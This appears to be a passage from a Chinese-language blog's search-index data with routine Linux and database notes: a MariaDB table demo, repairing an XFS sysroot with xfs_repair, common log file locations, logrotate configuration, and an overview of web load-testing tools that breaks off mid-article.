Field | Type&#xA0;&#xA0;&#xA0;&#xA0; | Null | Key | Default | Extra |+-------+----------+------+-----+---------+-------+| name&#xA0; | char(15) | YES&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0; | NULL&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || price | int(11)&#xA0; | YES&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0; | NULL&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || pages | int(11)&#xA0; | YES&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0; | NULL&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+-------+----------+------+-----+---------+-------+3 rows in set (0.02 sec)MariaDB [jaking]&gt; select * from mybook;+---------+-------+-------+| name | price | pages |+---------+-------+-------+| jaking1 | 30 | 518 || jaking2 | 50 | 518 || jaking3 | 80 | 518 || jaking4 | 100 | 518 |+---------+-------+-------+4 rows in set (0.00 sec)MariaDB [jaking]&gt; &#x8865;&#x5145;&#xFF1A;123456789create database jaking;use jaking;CREATE TABLE mybook (name char(15),price int,pages int);INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking1&apos;,&apos;30&apos;,&apos;518&apos;);INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking2&apos;,&apos;50&apos;,&apos;518&apos;);INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking3&apos;,&apos;80&apos;,&apos;518&apos;);INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking4&apos;,&apos;100&apos;,&apos;518&apos;);show tables;select * from mybook; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux无法挂载sysroot并自动进入紧急模式","date":"2022-06-07T04:56:22.000Z","path":"/posts/aabbd398/","text":"&#x5982;&#x679C;&#x7CFB;&#x7EDF;&#x51FA;&#x73B0;&#x975E;&#x6B63;&#x5E38;&#x5173;&#x673A;&#x4E4B;&#x540E;&#xFF1B;&#x5982;&#x610F;&#x5916;&#x65AD;&#x7535;&#x4E4B;&#x540E;&#xFF0C;&#x4F7F;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x51FA;&#x73B0;&#x9519;&#x8BEF;&#x72B6;&#x6001;&#xFF0C;&#x5BFC;&#x81F4;&#x7CFB;&#x7EDF;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x5F00;&#x673A; &#x5F00;&#x673A;&#x540E;&#x4F1A;&#x81EA;&#x52A8;&#x8FDB;&#x5165;&#x7D27;&#x6025;&#x6A21;&#x5F0F;&#xFF1A; &#x5F53;&#x5C1D;&#x8BD5;&#x8FDB;&#x884C;&#x6302;&#x8F7D;&#x7684;/sysroot&#x76EE;&#x5F55;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x51FA;&#x73B0;&#x4E0B;&#x9762;&#x7684;&#x62A5;&#x9519;&#xFF1A; mount: can&apos;t find /sysroot in /etc/fstab &#x4F7F;&#x7528;journalctl -xb&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x62A5;&#x9519;&#x4FE1;&#x606F; &#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x9700;&#x8981;&#x4F7F;&#x7528;xfs_repair&#x547D;&#x4EE4;&#x4FEE;&#x590D;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF; 1234[sudo] xfs_repair -v /dev/dm-0# &#x6216;&#xFF1A;# -L&#x9009;&#x9879;&#x53EF;&#x80FD;&#x4F1A;&#x635F;&#x574F;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;[sudo] xfs_repair&#xA0;-v&#xA0;-L&#xA0;/dev/dm-0 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux常见日志文件","date":"2022-06-07T04:55:52.000Z","path":"/posts/15c0e66c/","text":"&#x65E5;&#x5FD7;&#x6587;&#x4EF6; &#x8BF4;&#x660E; /var/log/message &#x5927;&#x591A;&#x6570;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x6D88;&#x606F;&#x8BB0;&#x5F55;&#x5728;&#x6B64;&#x5904;&#x3002;&#x4E5F;&#x6709;&#x4F8B;&#x5916;&#x7684;&#xFF1A;&#x5982;&#x4E0E;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF0C;&#x7535;&#x5B50;&#x90AE;&#x4EF6;&#x5904;&#x7406;&#x76F8;&#x5173;&#x7684;&#x5B9A;&#x671F;&#x4F5C;&#x4E1A;&#x4EFB;&#x52A1;&#x7B49; /var/log/secure &#x5B89;&#x5168;&#x548C;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x76F8;&#x5173;&#x7684;&#x6D88;&#x606F;&#x548C;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002;ssh&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;&#x4EA7;&#x751F;&#x7684;&#x65E5;&#x5FD7; /var/log/maillog &#x4E0E;&#x90AE;&#x4EF6;&#x670D;&#x52A1;&#x5668;&#x76F8;&#x5173;&#x7684;&#x6D88;&#x606F;&#x65E5;&#x5FD7;&#x6587;&#x4EF6; /var/log/cron &#x4E0E;&#x5B9A;&#x671F;&#x6267;&#x884C;&#x4EFB;&#x52A1;&#x76F8;&#x5173;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6; /var/log/boot.log &#x4E0E;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x76F8;&#x5173;&#x7684;&#x6D88;&#x606F;&#x8BB0;&#x5F55; /var/log/dmesg &#x4E0E;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x76F8;&#x5173;&#x7684;&#x6D88;&#x606F;&#x8BB0;&#x5F55; /var/log/wtmp &#x8BE5;&#x6587;&#x4EF6;&#x662F;&#x4E00;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#xFF0C;&#x8BB0;&#x5F55;&#x6BCF;&#x4E2A;&#x7528;&#x6237;&#x7684;&#x767B;&#x5F55;&#x6B21;&#x6570;&#x548C;&#x6301;&#x7EED;&#x65F6;&#x95F4;&#x7B49;&#x4FE1;&#x606F;&#x3002;&#x53EF;&#x4EE5;&#x7528;last&#x547D;&#x4EE4;&#x67E5;&#x770B;wtmp&#x7684;&#x5185;&#x5BB9;&#x3002; /var/log/btmp &#x8BB0;&#x5F55;&#x9519;&#x8BEF;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#x7684;&#x65E5;&#x5FD7;&#x3002;&#x53EF;&#x4EE5;&#x7528;lastb&#x547D;&#x4EE4;&#x67E5;&#x770B; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux的日志切割","date":"2022-06-07T04:55:37.000Z","path":"/posts/c4bbfe69/","text":"&#x5982;&#x679C;&#x65E5;&#x5FD7;&#x662F;&#x9759;&#x6001;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#x6CA1;&#x6709;&#x670D;&#x52A1;&#x5411;&#x91CC;&#x9762;&#x5199;&#x5185;&#x5BB9;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x5229;&#x7528;split&#x8FDB;&#x884C;&#x5207;&#x5272;&#x5982;&#x679C;&#x65E5;&#x5FD7;&#x662F;&#x52A8;&#x6001;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;logrotate &#x8FDB;&#x884C;&#x5207;&#x5272; logrotate/etc/logrotate.conf &#x9884;&#x8BBE;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6; &#x793A;&#x4F8B;&#xFF1A;&#x5BF9;ssh&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x5206;&#x5272;123456789vim /etc/logrotate.d/sshd/var/log/sshd.log{ missingok weekly create 0600 root root minsize 1M rotate 3} &#x91CD;&#x542F;1systemctl restart rsyslog &#x65E5;&#x5FD7;&#x5207;&#x5272;1logrotate -vf /etc/logrotate.d/sshd &#x65E5;&#x5FD7;&#x96C6;&#x4E2D;&#x7BA1;&#x7406; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"web性能压测学习","date":"2022-06-07T04:55:14.000Z","path":"/posts/d185f6ae/","text":"&#x5E38;&#x7528;&#x6027;&#x80FD;&#x538B;&#x6D4B;&#x5DE5;&#x5177;&#x5B9E;&#x6218;&#x603B;&#x7ED3;&#x4E00;&#x3001;&#x538B;&#x6D4B;&#x80CC;&#x666F; &#x4EE5;&#x524D;&#xFF1A;&#x672A;&#x51FA;&#x793E;&#x4F1A;&#x4E4B;&#x524D;&#x7ECF;&#x5E38;&#x7528;AB&#x5DE5;&#x5177;&#x6765;&#x538B;&#x6D4B;&#x81EA;&#x5DF1;&#x7684; nginx &#x6B22;&#x8FCE;&#x9875;&#x9762;&#xFF0C;&#x770B;&#x7740;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D44;&#x6E90;&#x4ECE;20%&#x5230;100%&#xFF0C;&#x53D1;&#x73B0;&#x539F;&#x6765;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x7684;&#x5DE5;&#x5177;&#x90FD;&#x53EF;&#x4EE5;&#x628A;&#x4E00;&#x53F0;4C8G&#x7684;&#x865A;&#x62DF;&#x673A;&#x538B;&#x7206;&#x6EE1;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x9677;&#x5165;&#x6C89;&#x601D;&#xFF0C;&#x4F4E;&#x6210;&#x672C;&#x7684;&#x538B;&#x6D4B;&#x90FD;&#x53EF;&#x4EE5;&#x9020;&#x6210;&#x4E00;&#x53F0;&#x865A;&#x62DF;&#x673A;&#x7684;&#x8D44;&#x6E90;&#x6EE1;&#x8D1F;&#x8F7D;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x662F;&#x4E2A;&#x9759;&#x6001;&#x9875;&#x9762;&#xFF0C;&#x90A3;&#x5982;&#x679C;&#x53D1;&#x751F;&#x5728;&#x4F01;&#x4E1A;&#x8EAB;&#x4E0A;&#x4F1A;&#x5982;&#x4F55;&#xFF1F;&#x9020;&#x6210;&#x7684;&#x635F;&#x5931;&#x8FDC;&#x8FDC;&#x9AD8;&#x4E8E;&#x538B;&#x6D4B;&#x65B9;&#xFF0C;&#x540E;&#x679C;&#x4E0D;&#x6562;&#x60F3;&#x8C61;&#x3002; &#x73B0;&#x5728;&#xFF1A;&#x6211;&#x627F;&#x8BA4;&#x4EE5;&#x524D;&#x592A;&#x5929;&#x771F;&#x4E86;&#xFF0C;&#x65E2;&#x7136;&#x6709;&#x538B;&#x6D4B;&#x65B9;&#xFF0C;&#x90A3;&#x80AF;&#x5B9A;&#x6709;&#x9632;&#x5FA1;&#x65B9;&#xFF0C;&#x9047;&#x5230;&#x6076;&#x610F;&#x538B;&#x6D4B;&#x4ED6;&#x4EBA;&#x7F51;&#x7AD9;&#x7684;&#xFF0C;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x5404;&#x79CD;&#x5168;&#x5BB6;&#x6876;&#x62C9;&#x9ED1;&#x3001;&#x5C4F;&#x853D;&#x6389;&#x5C31;&#x597D;&#x4E86;&#x3002;&#x90A3;&#x5BF9;&#x4E8E;&#x73B0;&#x5728;&#x4F01;&#x4E1A;&#x6765;&#x8BF4;&#xFF0C;&#x5404;&#x4EBA;&#x89C9;&#x5F97;&#x6700;&#x5927;&#x7684;&#x4EF7;&#x503C;&#x5C31;&#x662F;&#x63A2;&#x6D4B;&#x8D44;&#x6E90;&#x6027;&#x80FD;&#x3001;&#x8D44;&#x6E90;&#x5BB9;&#x91CF;&#x5408;&#x7406;&#x89C4;&#x5212;&#x3001;&#x589E;&#x5F3A;&#x4E1A;&#x52A1;&#x7A33;&#x5B9A;SLA&#x3001;&#x51CF;&#x5C11;&#x4E8B;&#x6545;&#x53D1;&#x751F;&#xFF0C;&#x8FD9;&#x4E2A;&#x5BF9;&#x4E8E;&#x6D4B;&#x8BD5;&#x8FD8;&#x662F;&#x8FD0;&#x7EF4;&#x6765;&#x8BF4;&#x90FD;&#x662F;&#x5929;&#x5927;&#x7684;&#x597D;&#x4E8B;&#xFF0C;&#x4E5F;&#x662F;&#x4EF7;&#x503C;&#x7684;&#x4F53;&#x73B0;&#x3002; &#x672A;&#x6765;&#xFF1A;&#x538B;&#x6D4B;&#x7684;&#x666E;&#x9002;&#x6027;&#xFF0C;&#x5BF9;&#x4F01;&#x4E1A;&#x5E26;&#x6765;&#x7684;&#x4EF7;&#x503C;&#x4E0D;&#x6B62;&#x63A2;&#x6D4B;&#x8D44;&#x6E90;&#x6027;&#x80FD;&#x3001;&#x8D44;&#x6E90;&#x5BB9;&#x91CF;&#x5408;&#x7406;&#x89C4;&#x5212;&#xFF0C;&#x8FD8;&#x6709;&#x6280;&#x672F;&#x67B6;&#x6784;&#x5347;&#x7EA7;&#x9A8C;&#x8BC1;&#x3001;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x4E0A;&#x7EBF;&#x6D4B;&#x8BD5;&#x3001;&#x4E1A;&#x52A1;&#x5CF0;&#x503C;&#x7A33;&#x5B9A;&#x6027;&#x6D4B;&#x8BD5;&#x7B49;&#x7B49;&#xFF0C;&#x901A;&#x8FC7;&#x538B;&#x6D4B;&#x6E05;&#x695A;&#x8D44;&#x6E90;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x964D;&#x4F4E;&#x76F2;&#x76EE;&#x9884;&#x4F30;&#x7684;&#x98CE;&#x9669;&#xFF0C;&#x63D0;&#x9AD8;&#x670D;&#x52A1;&#x7684;&#x53EF;&#x7528;&#x6027;&#x548C;&#x7A33;&#x5B9A;&#x6027;&#x3002; &#x6240;&#x4EE5;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x505A;&#x538B;&#x6D4B;&#xFF1F;&#x538B;&#x6D4B;&#x7684;&#x76EE;&#x7684;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x538B;&#x6D4B;(&#x6A21;&#x62DF;&#x771F;&#x5B9E;&#x7528;&#x6237;&#x7684;&#x884C;&#x4E3A;)&#xFF0C;&#x6D4B;&#x7B97;&#x51FA;&#x673A;&#x5668;&#x7684;&#x6027;&#x80FD;(&#x5355;&#x53F0;&#x673A;&#x5668;&#x7684;QPS)&#xFF0C;&#x4ECE;&#x800C;&#x63A8;&#x7B97;&#x51FA;&#x7CFB;&#x7EDF;&#x5728;&#x627F;&#x53D7;&#x6307;&#x5B9A;&#x7528;&#x6237;&#x6570;(100W)&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x591A;&#x5C11;&#x673A;&#x5668;&#x80FD;&#x652F;&#x6491;&#x5F97;&#x4F4F;&#x538B;&#x6D4B;&#x662F;&#x5728;&#x4E0A;&#x7EBF;&#x524D;&#x4E3A;&#x4E86;&#x5E94;&#x5BF9;&#x672A;&#x6765;&#x53EF;&#x80FD;&#x8FBE;&#x5230;&#x7684;&#x7528;&#x6237;&#x6570;&#x91CF;&#x7684;&#x4E00;&#x6B21;&#x9884;&#x4F30;(&#x63D0;&#x524D;&#x6F14;&#x7EC3;)&#xFF0C;&#x538B;&#x6D4B;&#x4EE5;&#x540E;&#x901A;&#x8FC7;&#x4F18;&#x5316;&#x7A0B;&#x5E8F;&#x7684;&#x6027;&#x80FD;&#x6216;&#x51C6;&#x5907;&#x5145;&#x8DB3;&#x7684;&#x673A;&#x5668;&#xFF0C;&#x6765;&#x4FDD;&#x8BC1;&#x7528;&#x6237;&#x7684;&#x4F53;&#x9A8C;&#x3002; &#x4E8C;&#x3001;&#x538B;&#x6D4B;&#x5DE5;&#x5177; &#x5DE5;&#x5177;&#x8BF4;&#x660E; AB&#xFF1A;ApacheBench &#x662F; Apache&#x670D;&#x52A1;&#x5668;&#x81EA;&#x5E26;&#x7684;&#x4E00;&#x4E2A;web&#x538B;&#x529B;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#xFF0C;&#x7B80;&#x79F0;ab&#x3002;ab&#x53C8;&#x662F;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;&#xFF0C;&#x5BF9;&#x53D1;&#x8D77;&#x8D1F;&#x8F7D;&#x7684;&#x672C;&#x673A;&#x8981;&#x6C42;&#x5F88;&#x4F4E;&#xFF0C;&#x6839;&#x636E;ab&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x5F88;&#x591A;&#x7684;&#x5E76;&#x53D1;&#x8BBF;&#x95EE;&#x7EBF;&#x7A0B;&#xFF0C;&#x6A21;&#x62DF;&#x591A;&#x4E2A;&#x8BBF;&#x95EE;&#x8005;&#x540C;&#x65F6;&#x5BF9;&#x67D0;&#x4E00;URL&#x5730;&#x5740;&#x8FDB;&#x884C;&#x8BBF;&#x95EE;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6D4B;&#x8BD5;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D1F;&#x8F7D;&#x538B;&#x529B;&#x3002;&#x603B;&#x7684;&#x6765;&#x8BF4;ab&#x5DE5;&#x5177;&#x5C0F;&#x5DE7;&#x7B80;&#x5355;&#x3001;&#x975E;&#x5E38;&#x8F7B;&#x91CF;&#x5316;&#x7684;&#x538B;&#x6D4B;&#x5DE5;&#x5177;&#xFF0C;&#x4E0A;&#x624B;&#x5B66;&#x4E60;&#x8F83;&#x5FEB;&#xFF0C;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;&#x9700;&#x8981;&#x7684;&#x57FA;&#x672C;&#x6027;&#x80FD;&#x6307;&#x6807;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x56FE;&#x5F62;&#x5316;&#x7ED3;&#x679C;&#xFF0C;&#x4E0D;&#x80FD;&#x76D1;&#x63A7;&#x3002; Jmeter&#xFF1A;Apache JMeter&#x662F;Apache&#x7EC4;&#x7EC7;&#x5F00;&#x53D1;&#x7684;&#x57FA;&#x4E8E;Java&#x7684;&#x538B;&#x529B;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#x3002;&#x7528;&#x4E8E;&#x5BF9;&#x8F6F;&#x4EF6;&#x505A;&#x538B;&#x529B;&#x6D4B;&#x8BD5;&#xFF0C;&#x5B83;&#x6700;&#x521D;&#x88AB;&#x8BBE;&#x8BA1;&#x7528;&#x4E8E;Web&#x5E94;&#x7528;&#x6D4B;&#x8BD5;&#xFF0C;&#x4F46;&#x540E;&#x6765;&#x6269;&#x5C55;&#x5230;&#x5176;&#x4ED6;&#x6D4B;&#x8BD5;&#x9886;&#x57DF;&#x3002;JMeter&#x80FD;&#x591F;&#x5BF9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x505A;&#x529F;&#x80FD;/&#x56DE;&#x5F52;&#x6D4B;&#x8BD5;&#xFF0C;&#x901A;&#x8FC7;&#x521B;&#x5EFA;&#x5E26;&#x6709;&#x65AD;&#x8A00;&#x7684;&#x811A;&#x672C;&#x6765;&#x9A8C;&#x8BC1;&#x4F60;&#x7684;&#x7A0B;&#x5E8F;&#x8FD4;&#x56DE;&#x4E86;&#x4F60;&#x671F;&#x671B;&#x7684;&#x7ED3;&#x679C;&#x3002; LoadRunner&#xFF1A;LR&#x662F;HP&#x63A8;&#x51FA;&#x7684;&#x4E00;&#x79CD;&#x9884;&#x6D4B;&#x7CFB;&#x7EDF;&#x884C;&#x4E3A;&#x548C;&#x6027;&#x80FD;&#x7684;&#x8D1F;&#x8F7D;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#xFF0C;&#x901A;&#x8FC7;&#x4EE5;&#x6A21;&#x62DF;&#x4E0A;&#x5343;&#x4E07;&#x7528;&#x6237;&#x5B9E;&#x65BD;&#x5E76;&#x53D1;&#x8D1F;&#x8F7D;&#x53CA;&#x5B9E;&#x65F6;&#x6027;&#x80FD;&#x76D1;&#x6D4B;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x786E;&#x8BA4;&#x548C;&#x67E5;&#x627E;&#x95EE;&#x9898;&#xFF0C;&#x5206;&#x4E3A;Windows &#x7248;&#x672C;&#x548C;Unix &#x7248;&#x672C;&#x3002;LoadRunner&#x80FD;&#x591F;&#x5BF9;&#x6574;&#x4E2A;&#x4F01;&#x4E1A;&#x67B6;&#x6784;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#x3002;&#x4F01;&#x4E1A;&#x4E5F;&#x80FD;&#x6700;&#x5927;&#x9650;&#x5EA6;&#x5730;&#x7F29;&#x77ED;&#x6D4B;&#x8BD5;&#x65F6;&#x95F4;&#xFF0C;&#x4F18;&#x5316;&#x6027;&#x80FD;&#x548C;&#x52A0;&#x901F;&#x5E94;&#x7528;&#x7CFB;&#x7EDF;&#x7684;&#x53D1;&#x5E03;&#x5468;&#x671F;&#x3002;&#x4E5F;&#x80FD;&#x9884;&#x6D4B;&#x7CFB;&#x7EDF;&#x884C;&#x4E3A;&#x5E76;&#x4F18;&#x5316;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x3002;&#x5546;&#x4E1A;&#x7248;&#x652F;&#x6301;&#x5F55;&#x5C4F;+&#x811A;&#x672C;&#x7684;&#x65B9;&#x5F0F;&#x3002; &#x963F;&#x91CC;&#x4E91;PTS&#xFF1A;PTS&#xFF08;Performance Testing Service&#xFF09;&#x662F;&#x9762;&#x5411;&#x6240;&#x6709;&#x6280;&#x672F;&#x80CC;&#x666F;&#x4EBA;&#x5458;&#x7684;&#x4E91;&#x5316;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#x3002;&#x6709;&#x522B;&#x4E8E;&#x4F20;&#x7EDF;&#x5DE5;&#x5177;&#x7684;&#x7E41;&#x590D;&#xFF0C;PTS&#x4EE5;&#x4E92;&#x8054;&#x7F51;&#x5316;&#x7684;&#x4EA4;&#x4E92;&#xFF0C;&#x63D0;&#x4F9B;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x3001;API&#x8C03;&#x8BD5;&#x548C;&#x76D1;&#x6D4B;&#x7B49;&#x591A;&#x79CD;&#x80FD;&#x529B;&#x3002;&#x81EA;&#x7814;&#x548C;&#x9002;&#x914D;&#x5F00;&#x6E90;&#x7684;&#x529F;&#x80FD;&#x90FD;&#x53EF;&#x4EE5;&#x8F7B;&#x677E;&#x6A21;&#x62DF;&#x4EFB;&#x610F;&#x4F53;&#x91CF;&#x7684;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x4E1A;&#x52A1;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x4EFB;&#x52A1;&#x968F;&#x65F6;&#x53D1;&#x8D77;&#xFF0C;&#x514D;&#x53BB;&#x7E41;&#x7410;&#x7684;&#x642D;&#x5EFA;&#x548C;&#x7EF4;&#x62A4;&#x6210;&#x672C;&#x3002;&#x66F4;&#x662F;&#x7D27;&#x5BC6;&#x7ED3;&#x5408;&#x76D1;&#x63A7;&#x3001;&#x6D41;&#x63A7;&#x7B49;&#x5144;&#x5F1F;&#x4EA7;&#x54C1;&#x63D0;&#x4F9B;&#x4E00;&#x7AD9;&#x5F0F;&#x9AD8;&#x53EF;&#x7528;&#x80FD;&#x529B;&#xFF0C;&#x9AD8;&#x6548;&#x68C0;&#x9A8C;&#x548C;&#x7BA1;&#x7406;&#x4E1A;&#x52A1;&#x6027;&#x80FD;&#x3002;&#x5F53;&#x7136;&#x4E5F;&#x53EF;&#x4EE5;&#x6A21;&#x62DF;&#x9ED1;&#x5BA2;&#x5BF9;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x8FDB;&#x884C;&#x5168;&#x9762;&#x6DF1;&#x5165;&#x7684;&#x5B89;&#x5168;&#x6D4B;&#x8BD5;&#xFF0C; &#x5E38;&#x7528;&#x5DE5;&#x5177;&#x5BF9;&#x6BD4; &#x5BF9;&#x6BD4;&#x9879;\\&#x538B;&#x6D4B;&#x5DE5;&#x5177; Apache Bench&#xFF08;ab&#xFF09; JMeter LoadRunner PTS &#x5B66;&#x4E60;&#x6210;&#x672C; &#x4F4E; &#x9AD8; &#x9AD8; &#x4F4E; &#x5B89;&#x88C5;&#x90E8;&#x7F72;&#x6210;&#x672C; &#x4F4E; &#x9AD8; &#x9AD8; &#x4F4E; &#x8D39;&#x7528; &#x65E0; &#x65E0; &#x6709; &#x6709; &#x591A;&#x534F;&#x8BAE; &#x5426; &#x662F; &#x662F; &#x662F; &#x56FE;&#x5F62;&#x5316;&#x5C55;&#x793A; &#x5426; &#x662F; &#x662F; &#x662F; TPS&#x6A21;&#x5F0F; &#x5426; &#x5426; &#x5426; &#x662F; &#x538B;&#x6D4B;&#x94FE;&#x8DEF;&#x3001;&#x573A;&#x666F;&#x7F16;&#x6392;&#x7BA1;&#x7406; &#x5426; &#x662F; &#x662F; &#x662F; &#x573A;&#x666F;&#x5F55;&#x5236; &#x5426; &#x662F; &#x662F; &#x662F; &#x751F;&#x6001;&#x73AF;&#x5883;&#x5F3A;&#x5F31; &#x5F31; &#x5F31; &#x5F31; &#x5F3A; &#x76D1;&#x63A7;&#x6307;&#x6807;&#x662F;&#x5426;&#x5B8C;&#x5907; &#x5426; &#x5426; &#x5426; &#x662F; &#x6D41;&#x91CF;&#x5730;&#x57DF;&#x5B9A;&#x5236; &#x5426; &#x5426; &#x5426; &#x662F; &#x538B;&#x6D4B;&#x6807;&#x51C6; &#x538B;&#x6D4B;&#x7C7B;&#x578B; &#x89E3;&#x91CA;&#x8BF4;&#x660E; &#x538B;&#x529B;&#x6D4B;&#x8BD5;(Stress Testing) &#x4E5F;&#x79F0;&#x4E4B;&#x4E3A;&#x5F3A;&#x5EA6;&#x6D4B;&#x8BD5;&#xFF0C;&#x6D4B;&#x8BD5;&#x4E00;&#x4E2A;&#x7CFB;&#x7EDF;&#x7684;&#x6700;&#x5927;&#x6297;&#x538B;&#x80FD;&#x529B;&#xFF0C;&#x5728;&#x5F3A;&#x8D1F;&#x8F7D;(&#x5927;&#x6570;&#x636E;&#x3001;&#x9AD8;&#x5E76;&#x53D1;)&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6D4B;&#x8BD5;&#x7CFB;&#x7EDF;&#x6240;&#x80FD;&#x627F;&#x53D7;&#x7684;&#x6700;&#x5927;&#x538B;&#x529B;&#xFF0C;&#x9884;&#x4F30;&#x7CFB;&#x7EDF;&#x7684;&#x74F6;&#x9888; &#x5E76;&#x53D1;&#x6D4B;&#x8BD5;(Concurrency Testing) &#x901A;&#x8FC7;&#x6A21;&#x62DF;&#x5F88;&#x591A;&#x7528;&#x6237;&#x540C;&#x4E00;&#x65F6;&#x523B;&#x8BBF;&#x95EE;&#x7CFB;&#x7EDF;&#x6216;&#x5BF9;&#x7CFB;&#x7EDF;&#x67D0;&#x4E00;&#x4E2A;&#x529F;&#x80FD;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;&#x6765;&#x6D4B;&#x8BD5;&#x7CFB;&#x7EDF;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x4ECE;&#x4E2D;&#x53D1;&#x73B0;&#x95EE;&#x9898;(&#x5E76;&#x53D1;&#x8BFB;&#x5199;&#x3001;&#x7EBF;&#x7A0B;&#x63A7;&#x5236;&#x3001;&#x8D44;&#x6E90;&#x4E89;&#x62A2;) &#x8010;&#x4E45;&#x6027;&#x6D4B;&#x8BD5;(Configuration Testing) &#x901A;&#x8FC7;&#x5BF9;&#x7CFB;&#x7EDF;&#x5728;&#x5927;&#x8D1F;&#x8377;&#x7684;&#x6761;&#x4EF6;&#x4E0B;&#x957F;&#x65F6;&#x95F4;&#x8FD0;&#x884C;&#xFF0C;&#x6D4B;&#x8BD5;&#x7CFB;&#x7EDF;&#x3001;&#x673A;&#x5668;&#x7684;&#x957F;&#x65F6;&#x95F4;&#x8FD0;&#x884C;&#x4E0B;&#x7684;&#x72B6;&#x51B5;,&#x4ECE;&#x4E2D;&#x53D1;&#x73B0;&#x95EE;&#x9898;(&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x3001;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x6C60;&#x4E0D;&#x91CA;&#x653E;&#x3001;&#x8D44;&#x6E90;&#x4E0D;&#x56DE;&#x6536;) &#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6307;&#x6807; 3.1 